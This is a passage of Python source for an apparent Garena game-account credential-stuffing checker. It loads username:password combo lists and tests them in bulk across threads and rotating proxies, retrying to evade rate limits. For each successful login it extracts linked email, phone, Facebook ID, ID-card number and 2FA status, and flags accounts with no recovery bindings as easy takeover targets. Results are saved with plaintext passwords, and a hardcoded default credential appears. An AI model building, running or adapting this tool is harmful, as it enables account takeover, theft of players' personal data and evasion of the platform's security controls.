    days = (now.date() - dt.date()).days
    if days <= 7:
        return f"{days} ngày trước ({time_part})"
    if days <= 30:
        return f"{max(1, days // 7)} tuần trước ({time_part})"
    if days <= 365:
        return f"{max(1, days // 30)} tháng trước ({time_part})"
    years = max(1, days // 365)
    return f"{years} năm trước ({time_part})"


def _is_account_center_source(game: str) -> bool:
    g = (game or "").strip().lower()
    return ("account center" in g) or ("account.garena" in g) or (g in {"ac", "account"})


def _resolve_best_last_login(h: dict) -> dict:
    """
    Chọn lần đăng nhập chuẩn (mới nhất, ưu tiên activity thật):
      1) login_history (bỏ Garena Account Center nếu còn entry khác)
      2) last_session_time + IP
      3) TCP last_login (CMD 276 — hay cũ hơn thực tế)
    Never raises (Windows Errno 22 safe).
    """
    if not isinstance(h, dict):
        return {}
    candidates = []

    try:
        for item in (h.get("login_history") or []):
            if not isinstance(item, dict):
                continue
            ts = _norm_unix_ts(item.get("ts") or 0)
            if not ts:
                ts = _safe_dt_to_ts(_parse_dt_any(item.get("time")))
            if not ts or ts < 946_684_800:
                continue
            game = (item.get("game") or "").strip()
            candidates.append({
                "ts": ts,
                "source": game or "Login history",
                "ip": (item.get("ip") or "").strip(),
                "country": (item.get("country") or "").strip(),
                "kind": "history",
                "is_ac": _is_account_center_source(game),
            })

        sess_dt = _parse_dt_any(h.get("last_session_time"))
        ts_sess = _safe_dt_to_ts(sess_dt)
        if ts_sess:
            candidates.append({
                "ts": ts_sess,
                "source": "Garena Session",
                "ip": (h.get("last_session_ip") or "").strip(),
                "country": (h.get("last_session_country") or "").strip(),
                "kind": "session",
                "is_ac": False,
            })

        ll_dt = _parse_dt_any(h.get("last_login"))
        ts_ll = _safe_dt_to_ts(ll_dt)
        if ts_ll:
            candidates.append({
                "ts": ts_ll,
                "source": "Garena TCP",
                "ip": "",
                "country": "",
                "kind": "tcp",
                "is_ac": False,
            })

        if not candidates:
            return {}

        real = [c for c in candidates if not c.get("is_ac")]
        pool = real if real else candidates
        best = max(pool, key=lambda c: c.get("ts") or 0)
        ts_best = _norm_unix_ts(best.get("ts") or 0)
        if not ts_best or ts_best < 946_684_800:
            return {}
        try:
            dt = _dt.datetime.fromtimestamp(ts_best)
        except (OSError, OverflowError, ValueError):
            return {}
        rel = _fmt_relative_dt(dt)
        bits = [rel]
        if best.get("source"):
            bits.append(best["source"])
        if best.get("ip"):
            cc = best.get("country") or ""
            bits.append(f"{best['ip']}" + (f" [{cc}]" if cc else ""))
        display = " · ".join(bits)
        dt_str = _safe_fromtimestamp(ts_best) or dt.strftime("%Y-%m-%d %H:%M:%S")
        return {
            "ts": ts_best,
            "display": display,
            "relative": rel,
            "source": best.get("source") or "",
            "ip": best.get("ip") or "",
            "country": best.get("country") or "",
            "dt_str": dt_str or "",
        }
    except Exception:
        return {}


def _finalize_hit_meta(result: dict) -> None:
    """Attach chuẩn last-login after all info sources merged."""
    if not isinstance(result, dict) or result.get("status") != "HIT":
        return
    try:
        # Ẩn created_time epoch rác
        gc = str(result.get("garena_created") or "")
        if "1970" in gc or "1969" in gc:
            result.pop("garena_created", None)
        meta = _resolve_best_last_login(result)
        if meta:
            result["_last_login_meta"] = meta
            result["last_login_best"] = meta.get("display") or ""
            result["last_login_ts"] = meta.get("ts") or 0
            if meta.get("dt_str"):
                result["last_login_resolved"] = meta["dt_str"]
    except Exception:
        pass

def _security_bindings_all_no(h: dict) -> bool:
    """True khi Email/SĐT/Pass/FB đều No (profile trống — có thể do proxy block)."""
    if not isinstance(h, dict):
        return True
    email_v = h.get('email_v', 0) or 0
    email_verified = h.get('email_verified', False)
    masked_email = str(h.get('masked_email', '') or '').strip()
    has_email = bool(email_verified or email_v > 0)
    if masked_email and masked_email.replace('*', '').replace('@', '').replace('.', ''):
        has_email = True

    mobile_bound = h.get('mobile_bound', False)
    masked_phone = str(h.get('masked_phone', '') or '').strip()
    prefill_phone = str(h.get('aov_prefill_mobile') or '').strip()
    has_phone = bool(mobile_bound or masked_phone or prefill_phone)

    fb_uid = str(h.get('fb_uid') or h.get('fb_uid_login') or '').strip()
    fb_name = str(h.get('fb_account_name') or '').strip()
    has_fb = bool(h.get('fb_linked', False) or fb_uid or fb_name)

    has_pass = bool(h.get('password_set', False))
    return not (has_email or has_phone or has_fb or has_pass)


def _needs_info_recheck(h: dict) -> bool:
    """
    HIT bị rate-limit/block khi lấy info → Email/SĐT/Pass/FB = No giả
    hoặc 'Acc Trắng (fetch thiếu — check lại)'. Nên đổi proxy check lại.

    Rule cứng: không có _acct_sec_ok (account/init fail) → BẮT BUỘC recheck.
    Khi _acct_sec_ok=True: tin profile (kể cả Acc Trắng all-No), không recheck.
    Không demote status HIT → ERROR; chỉ báo cần recheck/merge.
    """
    if not isinstance(h, dict) or h.get('status') != 'HIT':
        return False
    # Explicit flag set by fetch path
    if h.get('_info_fetch_incomplete') or h.get('_fetch_incomplete'):
        return True
    if h.get('_fetch_blocked') and not h.get('_acct_sec_ok'):
        return True
    if h.get('_needs_proxy_recheck') and not h.get('_acct_sec_ok'):
        return True
    # account.garena.com fail → không tin Email/SĐT/CCCD/2FA, phải đổi proxy
    if not h.get('_acct_sec_ok'):
        return True
    return False


def _derive_tinh_trang(h: dict) -> str:
    """Derive account status description from bindings."""
    pw = h.get('password_set', False)
    account_secured = bool(h.get('account_secured'))
    
    # Email verified
    email_v = h.get('email_v', 0) or 0
    email_verified = h.get('email_verified', False)
    masked_email = str(h.get('masked_email', '') or '').strip()
    has_email = email_verified or email_v > 0
    # Nếu có masked_email và không phải toàn dấu *
    if masked_email and masked_email.replace('*', '').replace('@', '').replace('.', ''):
        has_email = True
    
    # SĐT
    mobile_bound = h.get('mobile_bound', False)
    masked_phone = str(h.get('masked_phone', '') or '').strip()
    prefill_phone = str(h.get('aov_prefill_mobile') or '').strip()
    has_phone = mobile_bound or bool(masked_phone) or bool(prefill_phone)
    
    fb_uid = str(h.get('fb_uid') or h.get('fb_uid_login') or '').strip()
    fb_name = str(h.get('fb_account_name') or '').strip()
    fb = bool(h.get('fb_linked', False) or fb_uid or fb_name)
    idcard = str(h.get('idcard', '') or '').strip()
    cccd = bool(idcard.replace('*', '').replace('-', '').replace(' ', ''))
    auth = h.get('authenticator_enable', 0) or h.get('two_step_verify', 0)
    
    parts = []
    if has_phone:   parts.append('SĐT')
    if has_email:   parts.append('Mail')
    if fb:          parts.append('FB')
    if cccd:        parts.append('CCCD')
    if auth:        parts.append('2FA')
    if pw:          parts.append('Pass')
    if account_secured and not parts:
        parts.append('Secured')
    
    # BAN status (aov_banned = 'YES'/'NO' from kientuong)
    is_banned = _is_yes(h.get('aov_banned', ''))

    suspicious = int(h.get('suspicious', 0) or 0)

    total = len(parts)
    if total == 0:
        if h.get('_info_fetch_incomplete') or _needs_info_recheck(h):
            base = 'Acc Trắng (fetch thiếu — check lại)'
        else:
            base = 'Acc Trắng'
    elif total >= 4:
        base = 'Full Info'
    else:
        base = 'Acc Dính ' + ' + '.join(parts)

    suffix = []
    if is_banned:
        suffix.append('BAN')
    if suspicious:
        suffix.append('Suspicious')
    if suffix:
        return base + ' [' + ' + '.join(suffix) + ']'
    return base


def _normalize_country(code: str) -> str:
    if not code:
        return "UNKNOWN"
    raw = str(code).strip().upper()
    raw_ascii = unicodedata.normalize("NFKD", raw).encode("ascii", "ignore").decode("ascii")
    raw_ascii = re.sub(r"[^A-Z0-9]+", " ", raw_ascii).strip()
    vn_values = {"VN", "84", "+84", "VIETNAM", "VIET NAM", "VIET_NAM"}
    if raw in vn_values or raw_ascii in {"VN", "84", "VIETNAM", "VIET NAM"}:
        return "VIETNAM"
    return "UNKNOWN"


def _is_vietnam_result(r: dict) -> bool:
    """True nếu result xác định được là VN. Non-VN HIT bị loại khỏi log/stats."""
    if not isinstance(r, dict):
        return False
    ctry = _normalize_country(r.get("country") or "")
    if ctry == "VIETNAM":
        return True
    for key in ("country_code", "acc_country", "region", "last_session_country", "region_display"):
        n = _normalize_country(r.get(key) or "")
        if n == "VIETNAM":
            return True
    for key in ("aov_prefill_mobile", "masked_phone"):
        phone = str(r.get(key) or "").strip()
        if phone.startswith("+84") or phone.startswith("84 ") or re.match(r"^\+?84\d", phone):
            return True
    # HIT đã có dấu hiệu country/region mà không phải VN → non-VN
    if r.get("status") == "HIT" and (r.get("country") or r.get("region") or r.get("country_code")):
        return ctry == "VIETNAM"
    # Lỗi/timeout/DIE chưa biết nước — không coi là non-VN (vẫn đếm error/die)
    if r.get("status") in (
        "ERROR", "TIMEOUT", "PROXY_FAIL", "PORT_BLOCKED", "CAPTCHA",
        "INVALID", "NOT_FOUND", "MISS", "BANNED", "SEC_BANNED",
    ):
        return True
    return ctry == "VIETNAM"


def _ensure_vn_country_field(r: dict) -> None:
    """
    Nếu HIT đã được nhận là VN (SĐT +84 / region / …) mà field country trống/UNKNOWN,
    gán country=VIETNAM để _save_result không bỏ sót phân loại file.
    """
    if not isinstance(r, dict) or r.get("status") != "HIT":
        return
    if not _is_vietnam_result(r):
        return
    if _normalize_country(r.get("country") or "") == "VIETNAM":
        return
    r["country"] = "VIETNAM"
    if not (r.get("region") or "").strip():
        r["region"] = "VIETNAM"

def _fold_rank_text(s: str) -> str:
    """ASCII-fold rank text for matching."""
    t = unicodedata.normalize("NFKD", str(s or "").lower()).encode("ascii", "ignore").decode("ascii")
    t = re.sub(r"[_\-]+", " ", t)
    t = re.sub(r"[^a-z0-9.\s]", " ", t)
    return re.sub(r"\s+", " ", t).strip()


def _is_master_or_legend_rank(rank_raw: str) -> bool:
    f = _fold_rank_text(rank_raw)
    return (
        ("cao thu" in f)
        or ("chien tuong" in f)
        or ("chien than" in f)
        or ("thach dau" in f)
    )


def _rank_base_name(rank_raw: str) -> str:
    """
    Tên rank không kèm số sao.
    Giữ bậc La Mã (IV/III/…) — chỉ bỏ suffix 'N sao' hoặc số sao Ả Rập sau Cao Thủ.
    """
    s = str(rank_raw or "").strip()
    if not s:
        return ""
    # "T.Anh IV 3 sao" / "Cao Thủ 12 sao"
    s = re.sub(r"\s+\d{1,3}\s*sao\s*$", "", s, flags=re.I).strip()
    # "Cao Thủ 12" — strip trailing digits only for master/legend
    if _is_master_or_legend_rank(s):
        s = re.sub(r"\s+\d{1,3}$", "", s).strip()
    return s


def _extract_rank_stars(rank_raw: str, explicit: int = 0) -> int:
    """
    Lấy số sao:
      1) explicit aov_rank_stars
      2) suffix 'N sao'
      3) 'Cao Thủ N' / 'Chiến Tướng N'
    Không lấy La Mã IV/III làm sao.
    """
    try:
        ex = int(explicit or 0)
    except Exception:
        ex = 0
    if ex > 0:
        return ex
    s = str(rank_raw or "").strip()
    if not s:
        return 0
    m = re.search(r"(\d{1,3})\s*sao\s*$", s, flags=re.I)
    if m:
        n = int(m.group(1))
        return n if 1 <= n <= 99 else 0
    if _is_master_or_legend_rank(s):
        m2 = re.search(r"(\d{1,2})\s*$", s)
        if m2:
            n = int(m2.group(1))
            if 1 <= n <= 99:
                return n
    return 0


def _rank_display(rank_raw: str, stars: int = 0) -> str:
    """
    Format rank chuẩn:
      T.Anh IV 2 sao | Cao Thủ 12 sao | Vàng I 3 sao
    """
    rank = str(rank_raw or "").strip()
    if not rank:
        return ""
    stars_n = _extract_rank_stars(rank, stars)
    base = _rank_base_name(rank) or rank
    if stars_n > 0:
        return f"{base} {stars_n} sao"
    return base


def _apply_rank_to_result(result: dict, rank_name: str = "", rank_id=None,
                          rank_stars: int = 0, rank_entry: dict = None,
                          source: str = "") -> None:
    """
    Ghi aov_rank / aov_rank_stars.
    - Rank name = tên bậc (K.Cương III), không bắt buộc nhúng 'N sao' vào chuỗi
    - aov_rank_stars = max(old, new) — higher-is-better, không demote 5→1 / 4→1
    """
    if not isinstance(result, dict):
        return
    name = (rank_name or "").strip() or str(result.get("aov_rank") or "").strip()
    try:
        new_stars = int(rank_stars if rank_stars is not None else 0)
    except Exception:
        new_stars = 0
    if not new_stars:
        new_stars = _extract_rank_stars(name, 0) or _extract_rank_stars(
            result.get("aov_rank") or "", 0
        )
    try:
        old_stars = int(result.get("aov_rank_stars") or 0)
    except Exception:
        old_stars = 0
    # Higher-is-better: weekly 4 rồi kientuong 1 → giữ 4
    stars = max(int(new_stars or 0), int(old_stars or 0))
    base = _rank_base_name(name) or _rank_base_name(result.get("aov_rank") or "") or name
    if not base and not stars:
        return
    # id/entry/name: chỉ cập nhật khi nguồn mới không kém sao hơn (hoặc field còn trống)
    if rank_id is not None and (result.get("aov_rank_id") is None or new_stars >= old_stars):
        result["aov_rank_id"] = rank_id
    if rank_entry is not None and (not result.get("aov_rank_entry") or new_stars >= old_stars):
        result["aov_rank_entry"] = rank_entry
    if stars > 0:
        result["aov_rank_stars"] = stars
    elif "aov_rank_stars" not in result:
        result["aov_rank_stars"] = 0
    if base:
        if (
            not result.get("aov_rank")
            or new_stars >= old_stars
            or not _rank_base_name(result.get("aov_rank") or "")
        ):
            result["aov_rank"] = base
    if source:
        if new_stars > old_stars or not result.get("aov_rank_source") or old_stars <= 0:
            result["aov_rank_source"] = source


def _extract_master_stars(rank_raw: str) -> int:
    """Alias — lấy số sao từ chuỗi rank (mọi tier, ưu tiên Cao Thủ)."""
    return _extract_rank_stars(rank_raw, 0)

# ── Bulk loader ───────────────────────────────────────────────────────────────
HIT_FILE_HEADER = (
    "# SUSPICIOUS: 1 (Bị nghi vấn - Acc đang nằm trong danh sách theo dõi rủi ro của Garena. Cần cẩn thận khi thao tác đổi thông tin để tránh bị khóa bảo vệ.)\n"
    "# SUSPICIOUS: 0 (Bình thường)\n\n"
)


def _format_hit_line(h: dict) -> str:
    """Format a HIT result into the exact single-line hit.txt format."""
    if not isinstance(h, dict):
        return ""
    sk = h.get('aov_skins') if isinstance(h.get('aov_skins'), dict) else {}
    acc = str(h.get('account') or '').strip()
    pw = str(h.get('password') or '').strip()
    acc_pw = f"{acc}:{pw}"
    uid = str(h.get('uid') or '')
    name_gr = str(h.get('username') or h.get('nickname') or '')
    name_game = str(h.get('aov_name') or '')
    lv = int(h.get('aov_level', 0) or 0)

    # Rank hiện tại
    aov_rank = str(h.get('aov_rank') or '').strip()
    rank_base = _rank_base_name(aov_rank) or (aov_rank if aov_rank else "Chưa có")
    stars = int(h.get('aov_rank_stars', 0) or 0)
    if not stars and aov_rank:
        stars = _extract_master_stars(aov_rank) or 0
    rank_cur_str = f"{rank_base} ({stars}s)" if stars > 0 else (rank_base or "Chưa có")

    cp = int(sk.get('cp', 0) or 0)
    shells = int(h.get('shells', 0) or 0)

    # Email
    masked_email = str(h.get('masked_email') or '').strip()
    email_v = int(h.get('email_v', 0) or 0)
    if masked_email and masked_email.replace('*', '').replace('@', '').replace('.', ''):
        ok = bool(h.get('email_verified')) or (email_v > 0)
        email_str = f"Yes [{masked_email}] ({'ĐÃ XÁC THỰC' if ok else 'CHƯA XÁC THỰC'})"
    elif h.get('email_verified') or email_v > 0:
        email_str = "Yes [ĐÃ XÁC THỰC]"
    else:
        email_str = "No"

    # SĐT
    prefill = str(h.get('aov_prefill_mobile') or '').strip()
    masked_phone = str(h.get('masked_phone') or '').strip()
    best_phone = prefill or masked_phone
    if best_phone:
        sdt_str = f"YES [{best_phone}]"
    elif h.get('mobile_bound'):
        sdt_str = "YES"
    else:
        sdt_str = "No"

    # Pass
    pass_str = "YES" if h.get('password_set') else "No"

    # Authen
    auth_en = h.get('authenticator_enable', 0)
    two_step = h.get('two_step_verify', 0)
    if two_step:
        authen_str = "Yes (2FA)"
    elif auth_en:
        authen_str = "Yes"
    else:
        authen_str = "No"

    # FB
    _fb_uid_f = _normalize_fb_uid(h.get('fb_uid') or h.get('fb_uid_login') or '')
    fb_linked = bool(h.get('fb_linked') or _fb_uid_f or h.get('fb_account_name'))
    fb_str = f"YES [{_fb_uid_f}]" if _fb_uid_f else ("YES" if fb_linked else "NO")

    # CCCD
    idc = str(h.get('idcard') or '').strip()
    cccd_str = f"YES [{idc}]" if idc.replace('*', '').replace('-', '') else "NO"

    tot_champs = int(sk.get('total_champs', 0) or 0)
# ── HIT formatting & Saving (Delegated to hit_logger) ────────────────────────
from hit_logger import (
    format_hit_line as _format_hit_line,
    save_hit_result as _save_result,
    _derive_tinh_trang
)


def load_combos(filepath: str):
    combos = []
    seen = set()
    with open(filepath, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line: continue
            sep = "|" if "|" in line else ":"
            if sep in line:
                p = line.split(sep, 1)
                acc = p[0].strip()
                pw = p[1].strip()
                key = f"{acc}:{pw}"
                if key in seen:
                    continue
                seen.add(key)
                combos.append((acc, pw))
    return combos


def _save(filename: str, line: str, subdir: str = ""):
    """Append line to res/filename."""
    base = "res"
    os.makedirs(base, exist_ok=True)
    path = os.path.join(base, filename)
    text = line if line.endswith("\n") else line + "\n"
    with _save_lock:
        with open(path, "a", encoding="utf-8", newline="\n") as f:
            f.write(text)
            f.flush()
            try:
                os.fsync(f.fileno())
            except Exception:
                pass


# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    global _QUIET_BULK
    _print_banner()
    import threading
    args = sys.argv[1:]

    # Non-interactive usage / help (verification + scripting)
    if any(a in ("--help", "-h", "/?") for a in args):
        print("Usage: python garena.py <account> <password>")
        print("       python garena.py <combo_file.txt> [threads] [proxy.txt]")
        return

    test_login = any(a in ("--test-login", "-t") for a in args)
    args = [a for a in args if a not in ('--info', '-i', '--test-login', '-t')]

    if test_login:
        account = input("Account: ").strip() or "u502376961"
        password = input("Password: ").strip() or "Nnminh3019#"
        use_proxy = input("Proxy file (Enter để bỏ qua): ").strip()
        proxy = None
        if use_proxy:
            proxy_path = use_proxy if os.path.isfile(use_proxy) else os.path.join("combo", use_proxy)
            if os.path.isfile(proxy_path):
                load_proxies(proxy_path)
                proxy = _next_proxy()
        r = check_login(account, password, fetch_info=True, proxy=proxy, debug=True)
        # Luôn hiện HIT box + khối CHI TIẾT (SessKey/SĐT/Rank/Skin/…)
        _print_result(r, verbose=True, force_box=True)
        if r.get("status") == "HIT":
            _save_result(r)
            print(_c(C.GREEN, "  -> saved to res/"))
        return

    if not args:
        print("Chọn chức năng:")
        print("1. Test login (mặc định: u502376961:Nnminh3019#)")
        print("2. Check combo file")
        mode = input("Nhập số (mặc định 1): ").strip() or "1"

        if mode == "1":
            raw_acc = input("Nhập account (mặc định u502376961): ").strip() or "u502376961"
            raw_pwd = input("Nhập password (mặc định Nnminh3019#): ").strip() or "Nnminh3019#"
            use_proxy = input("Proxy file (Enter để bỏ qua): ").strip()
            proxy = None
            if use_proxy:
                proxy_path = use_proxy if os.path.isfile(use_proxy) else os.path.join("combo", use_proxy)
                if os.path.isfile(proxy_path):
                    load_proxies(proxy_path)
                    proxy = _next_proxy()

            print(_c(C.CYAN, f"\n[*] Đang kiểm tra đăng nhập & bóc tách dữ liệu: {raw_acc}..."))
            r = check_login(raw_acc, raw_pwd, fetch_info=True, proxy=proxy, debug=True)
            _print_result(r, verbose=True, force_box=True)
            if r.get("status") == "HIT":
                _save_result(r)
                print(_c(C.GREEN, "  -> saved to res/"))
            return

        os.makedirs("combo", exist_ok=True)
        files = [f for f in os.listdir("combo") if f.lower().endswith(".txt")]
        files.sort()
        if not files:
            print("Không có file .txt trong thư mục combo/")
            return
        print("Chọn file combo:")
        for i, f in enumerate(files, 1):
            print(f"{i}. {f}")
        while True:
            c = input("Nhập số: ").strip()
            if c.isdigit() and 1 <= int(c) <= len(files):
                break
        combo_arg = os.path.join("combo", files[int(c) - 1])
        t = input("Threads (mặc định 5): ").strip()
        threads = int(t) if t.isdigit() and int(t) > 0 else 5
        proxy_in = input("Proxy file (Enter để bỏ qua): ").strip()
        if proxy_in:
            proxy_file = proxy_in if os.path.isfile(proxy_in) else os.path.join("combo", proxy_in)
            args = [combo_arg, str(threads), proxy_file] if os.path.isfile(proxy_file) else [combo_arg, str(threads)]
        else:
            args = [combo_arg, str(threads)]

    combo_arg = args[0] if args else ""
    combo_file = combo_arg if combo_arg and os.path.isfile(combo_arg) else ""
    if not combo_file and combo_arg:
        combo_in_folder = os.path.join("combo", combo_arg)
        if os.path.isfile(combo_in_folder):
            combo_file = combo_in_folder

    if combo_file:
        # Bulk mode: python garena.py acc.txt [threads] [proxy.txt]
        # Any integer arg = threads, any extra file arg = proxy
        threads    = 5
        proxy_file = None
        for a in args[1:]:
            if a.isdigit():
                threads = max(1, int(a))
            elif os.path.isfile(a):
                proxy_file = a

        if proxy_file:
            load_proxies(proxy_file)
            print(f"Loaded {len(_proxy_list)} proxies from {proxy_file}")
            print(_c(C.YELLOW, "Loc proxy chet (TCP)..."))
            validate_proxies_tcp(print_fn=print, batch_size=100, timeout=3)
            if _proxy_list:
                print(_c(C.YELLOW, f"Kiem tra proxy qua {_GARENA_PROBE_URL} ..."))
                validate_proxies_garena(print_fn=print)
        else:
            print(_c(C.YELLOW, f"Khong proxy: bat che do direct-connect on dinh, timeout={_DIRECT_LOGIN_TIMEOUT}s, active<={_DIRECT_MAX_WORKERS}."))
            _resolve_host_ip()

        combos = load_combos(combo_file)
        
        # ── Lọc bỏ acc đã có trong thư mục res/ qua module dedup_filter ───
        try:
            from dedup_filter import filter_combos
            combos = filter_combos(combos, res_dir="res", verbose=True)
        except Exception:
            pass

        total = len(combos)
        if total == 0:
            print(_c(C.RED, "Không còn acc nào mới để check."))
            return
        # ───────────────────────────────────────────────────────────────────

        effective_threads = _compute_bulk_threads(threads)
        print(f"Loaded {total} combos | threads={threads} | active={effective_threads}")
        if threads > 500:
            print(_c(C.YELLOW, f"  [!] threads={threads} qua cao co the gay 'WinError 10048' (Windows het port). Khuyen dung <= 500."))
        elif effective_threads < threads:
            print(_c(C.YELLOW, f"  [!] Giam concurrency thuc te xuong {effective_threads} de on dinh CPM va tranh nghen proxy/socket."))

        hits_lock = threading.Lock()
        _stats = {
            'done': 0, 'total': total, 'hits': 0, 'invalid': 0, 'error': 0,
            'white_hits': 0, 'white_shells': 0,
        }
        _started_at = time.time()
        _QUIET_BULK = True

        # MISS result=101/105/174 = tai khoan khong phai Garena -> bo qua ERR
        _SKIP_MISS = ('result=101', 'result=105', 'result=174')

        def _worker(entry):
            idx, acc, pw = entry
            acc_idx = idx - 1
            r = {"account": acc, "password": pw, "status": "ERROR", "detail": "worker_not_run"}
            best_hit = None

            # check_login đã tự drop proxy + retry; worker thêm vòng dự phòng
            max_attempts = 3 if _proxy_list else 1
            for attempt in range(max_attempts):
                if _proxy_list:
                    proxy = _proxy_fallback_for_account(acc_idx, attempt) or _next_proxy()
                else:
                    proxy = None

                r = check_login(acc, pw, fetch_info=True, proxy=proxy, acc_idx=acc_idx)
                detail = r.get('detail', '') or ''
                is_skip_miss = (
                    r.get('status') == 'MISS' and
                    any(code in detail for code in _SKIP_MISS)
                )

                proxy_failed = (
                    r.get('status') in ('PROXY_FAIL', 'TIMEOUT', 'ERROR', 'CAPTCHA') or
                    _is_proxy_error(detail) or
                    _is_port_exhaustion(detail)
                )
                # fetch thiếu → loại proxy + retry
                info_proxy_bad = bool(_proxy_list) and (
                    _needs_info_recheck(r) or r.get('_info_fetch_incomplete')
                )
                if r.get('status') == 'HIT':
                    if best_hit is None:
                        best_hit = dict(r)
                    else:
                        best_hit = _merge_hit_prefer(best_hit, r)

                if (proxy_failed or info_proxy_bad) and _proxy_list:
                    reason = detail or r.get('status', '')
                    if info_proxy_bad:
                        reason = 'info_fetch_incomplete_or_all_no_blocked'
                    if proxy:
                        _mark_proxy_bad(proxy, reason)
                    if attempt < max_attempts - 1:
                        time.sleep(0.4 * (attempt + 1))
                        continue
                break

            # Ưu tiên HIT đã merge đủ field nhất
            if best_hit:
                if r.get('status') != 'HIT':
                    r = best_hit
                else:
                    r = _merge_hit_prefer(best_hit, r)
            is_skip_miss = (
                r.get('status') == 'MISS' and
                any(code in (r.get('detail') or '') for code in _SKIP_MISS)
            )

            # Non-VN: bỏ hoàn toàn — không đếm HIT, không save, không log riêng
            is_non_vn = (
                r.get('status') == 'HIT'
                and not _is_vietnam_result(r)
            )

            with hits_lock:
                _stats['done'] += 1
                if is_non_vn:
                    pass  # chỉ tăng done (progress), không cộng HIT/DIE/ERR
                elif r['status'] == 'HIT':
                    _stats['hits'] += 1
                    if _derive_tinh_trang(r) == 'Acc Trắng':
                        _stats['white_hits'] += 1
                        try:
                            _stats['white_shells'] += int(r.get('shells', 0) or 0)
                        except Exception:
                            pass
                elif r['status'] == 'INVALID':
                    _stats['invalid'] += 1
                elif not is_skip_miss and r['status'] in ('ERROR', 'TIMEOUT', 'MISS', 'PROXY_FAIL', 'CAPTCHA'):
                    _stats['error'] += 1
                snap = dict(_stats)
            with _print_lock:
                _print_bulk_status(snap, _started_at)
            if not is_non_vn:
                _save_result(r)

        try:
            with ThreadPoolExecutor(max_workers=effective_threads) as ex:
                for _ in ex.map(_worker, ((i + 1, a, p) for i, (a, p) in enumerate(combos))):
                    pass
        finally:
            _QUIET_BULK = False

        hits_total = _stats['hits']
        white_hits_total = _stats.get('white_hits', 0)
        white_shells_total = _stats.get('white_shells', 0)
        print()
        print(_c(C.CYAN + C.BOLD, f"\n{'═'*50}"))
        print(_c(C.GREEN + C.BOLD, f"  ✔  DONE: {hits_total} HIT / {total} accounts  →  res/"))
        print(_c(C.YELLOW + C.BOLD, f"  ✔  ACC TRẮNG: {white_hits_total} | TỔNG SÒ ACC TRẮNG: {white_shells_total}"))
        print(_c(C.CYAN + C.BOLD, f"{'═'*50}"))
        return

    # Single check mode
    if len(args) < 2:
        print("Usage: python garena.py <account> <password>")
        print("       python garena.py <combo_file.txt> [threads] [proxy.txt]")
        print("       python garena.py --test-login")
        print("  threads default = 5")
        return
    account  = args[0]
    password = args[1]
    print(f"Checking {account}")
    r = check_login(account, password, fetch_info=True)
    # force_box: luôn in HIT box + CHI TIẾT (kể cả non-VN / fetch thiếu)
    _print_result(r, verbose=True, force_box=True)
    _save_result(r)
    if r["status"] == "HIT":
        print(_c(C.GREEN, "  -> saved to res/"))


if __name__ == "__main__":
    main()